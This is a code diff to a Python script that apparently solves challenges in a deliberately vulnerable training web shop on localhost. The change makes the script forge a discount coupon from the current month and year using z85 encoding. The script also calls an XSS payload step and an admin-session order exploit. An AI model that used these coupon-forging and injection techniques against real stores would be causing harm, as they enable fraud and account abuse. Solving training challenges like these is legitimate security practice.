@@ -1,4 +1,5 @@
 import json
+import datetime
 
 from zmq.utils import z85
 
@@ -99,7 +100,7 @@ def forge_coupon(server):
     basketid = get_current_user_id(server, session)
     payload = _build_basket_payload(2, basketid, 1)
     _add_to_basket(server, session, payload)
-    couponcode = _generate_coupon('DEC16-99')
+    couponcode = _generate_coupon()
     print('Applying forged coupon...'),
     applycoupon = session.put('{}/{}/coupon/{}'.format(_get_basket_url(server), basketid, couponcode))
     if not applycoupon.ok:
@@ -146,9 +147,15 @@ def _checkout(server, session, basketid):
     if not checkout.ok:
         raise RuntimeError('Error checking out basket.')
 
-
-def _generate_coupon(inputstr):
-    return z85.encode(inputstr)
+def _generate_coupon():
+    """
+    Generate coupon using current month/year
+    :return: 
+    """
+    now = datetime.datetime.now()
+    month = now.strftime('%b').upper()
+    year = now.strftime('%y')
+    return z85.encode('{month}{year}-99'.format(month=month, year=year))
 
 
 def solve_product_challenges(server):
@@ -161,3 +168,8 @@ def solve_product_challenges(server):
     update_product_with_xss3_payload(server, session)
     forge_coupon(server)
     print('\n== PRODUCT CHALLENGES COMPLETE ==\n')
+
+if __name__ == '__main__':
+    server = 'http://localhost:3000'
+    session = get_admin_session(server)
+    order_christmas_special(server, session)
